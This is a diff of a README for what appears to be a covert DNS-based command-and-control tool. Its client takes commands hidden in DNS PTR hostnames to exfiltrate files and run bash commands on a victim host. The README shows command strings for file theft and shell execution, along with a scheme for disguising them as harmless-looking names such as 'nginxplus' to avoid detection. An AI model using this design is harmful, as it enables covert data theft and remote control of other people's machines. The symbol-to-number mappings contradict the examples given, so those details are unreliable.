@@ -24,52 +24,54 @@ Once it is running, **BC** will continuously send heartbeat data to **BS**.
 
 For example:
 
-    cmd.exfil-single.test.txt
+    cmd-exf-single.test.txt
 
 will tell **BC** that it has received a command (cmd) to exfiltrate (exfil) the single file (single) test.txt (test.txt). 
 
 If a path must be specified, the command format can be changed:
 
-    cmd.exfil-path.home-dscully-test.txt
+    cmd-exf-path.home-dscully-test.txt
 
 this tells **BC** to use the path /home/dscully/test.txt for locating the file to be exfiltrated.
 
 This command format, though, exposes the server's intentions very quickly. For that purpose, **BC** can be modified prior to deployment to include explicit mappings between hardcoded command strings and custom-tailored strings that will be sent by the server. For instance,
 
-    cmd.exfil-path.home-dscully-test.txt
+    cmd-exf-path.home-dscully-test.txt
 
 becomes
 
-    nginxplus.al-in.home-dscully-test.txt
+    nginxplus-al-in.home-dscully-test.txt
 
 Further specification can mask the targeted file(s):
 
-    nginxplus.al-in.1f96-lb-github.com
+    nginxplus-al-in.1f96-lb-github.com
 
 though this requires that you know the name and extension of the targeted file in advance. Client hardcodings cannot be changed without rebuilding the application client-side.
 
 On **BC**'s side, each section of the received 'command' hostname is broken down as follows:
 
-[0]     cmd
+Sections are:
+[0]			cmd - (bash AND bash binary) OR cmd - exfil - single/path
+[1]			bash command argument(s) OR exfil file path
 
-[1]		action-type
+Exfil Example:
 
-[2]		filename-or-filepath
+    cmd-exf-single.test.txt
 
-[3]		extension
+Due to the restrictions of characters allowed in DNS PTR responses, not all bash commands can be typed in the native format. For that reason, mappings between symbols and strings allow **BC** to interpret incoming bash commands correctly without forcing **BS** to send the native commands:
 
-as such, each index is expected to hold certain values. This format must be followed for **BC** to function correctly.
+Bash Example:	
 
-For bash command execution, command formatting is identical:
+    cmd-bash-cd.79-77-ls
 
-    cmd.bash.rm-test
+where 89 maps to '..', and 87 maps to ';'. The translated command here would be:
 
-will remove the file 'test',
+    cd .. ; ls
 
-    cmd.bash.ls
+Each section of the command is expected to hold certain values. This format must be followed for **BC** to function correctly.
 
-will return the output of the 'ls' command,
+More examples:
 
-    cmd.bash.mkdir-test2
+Echoing test into a file:
 
-will create the directory 'test2', and so on.
+    cmd-bash-echo.76test76-7575-echotest79txt
